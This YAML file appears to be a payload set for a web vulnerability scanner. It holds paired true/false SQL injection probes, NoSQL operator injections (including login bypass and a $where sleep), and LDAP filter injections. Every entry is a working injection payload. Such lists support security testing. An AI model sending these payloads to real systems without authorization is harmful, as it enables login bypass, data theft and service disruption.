boolean_pairs:
  - true: "' AND 1=1--"
    false: "' AND 1=2--"
  - true: "' AND 'a'='a"
    false: "' AND 'a'='b"
  - true: "1 AND 1=1"
    false: "1 AND 1=2"
  - true: "' AND ASCII(SUBSTRING(version(),1,1))>0--"
    false: "' AND ASCII(SUBSTRING(version(),1,1))>255--"
  - true: "' AND (SELECT 1)=1--"
    false: "' AND (SELECT 1)=2--"
  - true: "1' AND SUBSTRING(version(),1,1)='5'--"
    false: "1' AND SUBSTRING(version(),1,1)='X'--"
  - true: "' OR 1=1--"
    false: "' OR 1=2--"
  - true: "' OR 'abc'='abc'--"
    false: "' OR 'abc'='xyz'--"

nosql_payloads:
  - '{"$gt": ""}'
  - '{"$ne": null}'
  - '{"$where": "sleep(5000)"}'
  - '{"$regex": ".*"}'
  - '[$ne]=1'
  - '[$gt]='
  - '[$where]=function(){return+true}'
  - '{"username": {"$gt": ""}, "password": {"$gt": ""}}'
  - "' || 'a'=='a"
  - "'; return true; //"
  - "\"; return true; //"
  - "' || 1==1//"

ldap_payloads:
  - "*"
  - "*)(&"
  - "*)(|(objectClass=*"
  - ")(cn=*"
  - "admin)(&(password=*))"
  - "*()|%26'"
  - "*()|&'"
  - "*(|(mail=*))"
  - "*)(|(password=*))"
  - "*)(%0a"

oob_templates:
